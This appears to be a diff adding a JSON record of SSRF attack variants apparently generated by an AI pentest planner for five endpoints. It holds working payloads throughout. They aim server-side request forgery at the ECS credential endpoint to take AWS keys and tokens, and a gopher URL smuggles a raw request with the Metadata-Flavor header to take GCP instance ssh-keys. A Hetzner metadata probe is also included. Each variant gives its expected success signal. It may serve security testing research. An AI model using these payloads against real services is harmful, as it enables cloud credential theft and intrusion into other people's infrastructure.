@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_2",
+ "model": "opencode/mimo-v2.6-flash-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "GET /internal/fetch-resource",
+   "target_param": "resource_url",
+   "recon_evidence": "Container environment exposes AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/xxxx and ECS task metadata endpoint reachable from the pod network.",
+   "planner_rationale": "Reconstruct the task-role credential URI against the ECS metadata address observed in the environment.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.170.2/v2/credentials/",
+   "injection_point": "query",
+   "expected_success_signal": "Response body contains AccessKeyId, SecretAccessKey and Token fields for the ECS task role",
+   "confidence": 0.9,
+   "reasoning": "ECS tasks fetch role credentials from 169.254.170.2 rather than the EC2 IMDS address, and the relative URI from AWS_CONTAINER_CREDENTIALS_RELATIVE_URI completes the path, so the observed container environment directly selects this payload."
+  },
+  {
+   "endpoint": "POST /api/v2/proxy",
+   "target_param": "target",
+   "recon_evidence": "Application runs as an ECS task behind Fargate; IMDSv2 hop limit blocks 169.254.169.254 but the container credential endpoint answers on the link-local address.",
+   "planner_rationale": "The proxy takes the destination as a form field, so post the ECS credential URL as the target body parameter.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.170.2/v2/credentials/",
+   "injection_point": "body",
+   "expected_success_signal": "JSON containing AccessKeyId/SecretAccessKey/Token for the task role returned in the proxy response",
+   "confidence": 0.85,
+   "reasoning": "Because IMDSv2 is unreachable from the task, the only credential source is the ECS agent endpoint on 169.254.170.2; sending it as the form-encoded target parameter of the proxy matches the observed request format."
+  },
+  {
+   "endpoint": "GET /api/link-preview",
+   "target_param": "href",
+   "recon_evidence": "Workload deployed on GCP; compute metadata v1 requires the Metadata-Flavor: Google header while the v1beta1 endpoint returns 403, and the fetcher only forwards user-controlled query parameters.",
+   "planner_rationale": "Use gopher to emit a raw HTTP request that includes the mandatory Metadata-Flavor header the fetcher cannot set.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a",
+   "injection_point": "query",
+   "expected_success_signal": "Instance ssh-keys attribute returned in the preview body with Metadata-Flavor satisfied in the raw request",
+   "confidence": 0.8,
+   "reasoning": "gopher permits arbitrary raw TCP bytes, so the SSRF can carry the exact HTTP request including Metadata-Flavor: Google that plain URL fetching cannot supply, which is precisely the header gate observed during recon."
+  },
+  {
+   "endpoint": "POST /render/fetch",
+   "target_param": "source_url",
+   "recon_evidence": "Header-based fetch endpoint on a GCP instance where the renderer rejects direct metadata.google.internal hosts but forwards the X-Source-Url header verbatim to its HTTP client.",
+   "planner_rationale": "Supply the crafted gopher request through the header the renderer copies into its outbound request.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a",
+   "injection_point": "header",
+   "expected_success_signal": "SSH keys from the instance attributes appear in the rendered output",
+   "confidence": 0.72,
+   "reasoning": "The header-controlled fetcher still cannot attach Metadata-Flavor to an http URL, so gopher's raw request bytes are required; confidence is slightly lower because it depends on the client honouring an arbitrary scheme supplied via a header."
+  },
+  {
+   "endpoint": "GET /api/v1/healthcheck/upstream",
+   "target_param": "upstream_url",
+   "recon_evidence": "Cluster fingerprints point to Hetzner Cloud (floating IP and hcloud agent banners); AWS and GCP metadata paths returned no content while the link-local address responded.",
+   "planner_rationale": "Probe the vendor-specific Hetzner metadata route to enumerate the instance from the internal network position.",
+   "vuln_class": "ssrf",
+   "payload": "http://169.254.169.254/hetzner/v1/metadata",
+   "injection_point": "query",
+   "expected_success_signal": "JSON containing hostname, instance-id, region and public IPv4/IPv6 addresses",
+   "confidence": 0.82,
+   "reasoning": "Hetzner exposes its inventory at /hetzner/v1/metadata on the link-local address, matching the observed vendor fingerprints, so this path yields the instance metadata the standard AWS-style listing does not."
+  }
+ ],
+ "raw_tail": " \"expected_success_signal\": \"JSON containing hostname, instance-id, region and public IPv4/IPv6 addresses\",\n    \"confidence\": 0.82,\n    \"reasoning\": \"Hetzner exposes its inventory at /hetzner/v1/metadata on the link-local address, matching the observed vendor fingerprints, so this path yields the instance metadata the standard AWS-style listing does not.\"\n  }\n]\n\u001b[0m\n> build · mimo-v2.6-flash-free\n"
+}
